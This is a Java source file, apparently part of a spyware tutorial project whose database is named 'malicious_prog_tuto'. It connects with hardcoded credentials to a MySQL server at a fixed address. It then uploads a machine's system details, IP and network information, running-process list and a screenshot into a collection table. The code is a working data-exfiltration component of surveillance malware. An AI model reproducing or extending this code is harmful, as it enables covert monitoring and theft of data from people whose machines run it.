/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package mathematica_prog;

import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;
import com.mysql.jdbc.Statement;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Date;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author amine gasa
 */
public class Database {
    
  private final  String user=/*"root"*/"amine mhd 1234";
   private final  String password=/*""*/"amine mhd 1234";
   String ipLocal="192.168.1.200";
   private String url="jdbc:mysql://" + ipLocal + ":3306/malicious_prog_tuto";
   private Connection cnx;
  private Statement st;
  private PreparedStatement st1;
   public void ConnexionIntoDatabase(){
      try {
          Class.forName("com.mysql.jdbc.Driver");

          try {
              cnx=(Connection)DriverManager.getConnection(url,user,password);
           //   System.out.println("Successful connexion");
          } catch (SQLException ex) {
              Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
          }
          
          
      } catch (ClassNotFoundException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
   }
    public void insertData(String  sys_info, String ip_info , String list_process,String network_info){
      try {
          st=(Statement)cnx.createStatement();
          String sql="INSERT INTO data (sys_info,ip_info,list_process,network_info,date,image) values(?,?,?,?,?,?); ";
          st1=(PreparedStatement)cnx.prepareStatement(sql);
          FileInputStream fis;byte[]buf;
          try {
              fis=new FileInputStream(new File("ScreenShot.png"));
              ByteArrayOutputStream bos=new ByteArrayOutputStream();
              buf=new byte[1024];
              try {
                  for(int readNum;(readNum=fis.read(buf))!=-1;){
                      bos.write(buf,0,readNum);
                      
                  }
                  byte[]image=bos.toByteArray();
                  st1.setString(1, sys_info);
                  st1.setString(2, ip_info);
                  st1.setString(3, list_process);
                   st1.setString(4, network_info); 
                   st1.setString(5, DateTime());
                   st1.setBytes(6, image);
                   st1.executeUpdate();fis.close();st1.close();st.close();bos.close();cnx.close();
                   
                   
                   
              } catch (IOException ex) {
                  Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
              }
          } catch (FileNotFoundException ex) {
              Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
          }
      } catch (SQLException ex) {
          Logger.getLogger(Database.class.getName()).log(Level.SEVERE, null, ex);
      }
    }

    private String DateTime() {
        Date da=new Date();
        SimpleDateFormat sdf=new SimpleDateFormat("YYYY/MM/dd HH:mm:ss");
        return sdf.format(da);
    }

  

   
}
